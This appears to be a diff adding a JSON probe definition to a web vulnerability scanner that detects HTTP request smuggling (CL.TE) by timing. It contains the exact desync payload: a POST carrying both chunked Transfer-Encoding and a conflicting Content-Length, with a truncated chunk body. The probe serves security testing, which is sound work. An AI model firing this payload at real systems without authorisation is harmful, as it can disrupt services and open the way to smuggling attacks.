@@ -1,0 +1,40 @@
+{
+  "name": "elite/Request smuggling CL.TE timing oracle",
+  "description": "[critical] Kettle's differential-timing CL.TE detection (PortSwigger Academy probe, exact bytes): POST with Transfer-Encoding chunked + Content-Length 4 and body '1\\r\\nA\\r\\nX' — front-end (CL) truncates, back-end (TE) waits for the next chunk -> response hangs on the timeout. Keywords: request smuggling desync cl.te timing proxy reverse. ctrl: benign fast POST fails the latency condition -> not falsified. probe_url = site root. SLOW probe: hang lasts one back-end timeout (~10s+); use trials=2 need=2. Requires the sandbox/curl path (host-side requests rewrites Content-Length). Follow-up: same-connection response-differential probe needs a raw-socket fetch primitive (not expressible in this DSL).",
+  "cwe": "CWE-444",
+  "requests": {
+    "baseline": {
+      "method": "POST",
+      "url": "{{base_url}}/",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "x=1"
+    },
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/",
+      "headers": {
+        "Transfer-Encoding": "chunked",
+        "Content-Length": "4"
+      },
+      "body": "1\r\nA\r\nX"
+    }
+  },
+  "conditions": [
+    {
+      "type": "latency_delta",
+      "request_a": "baseline",
+      "request_b": "payload",
+      "min_delta": 4.0
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "3125e4ef519c",
+  "created": "2026-11-05T18:20:19.655790+00:00",
+  "last_used": "2026-11-05T18:20:19.655790+00:00"
+}
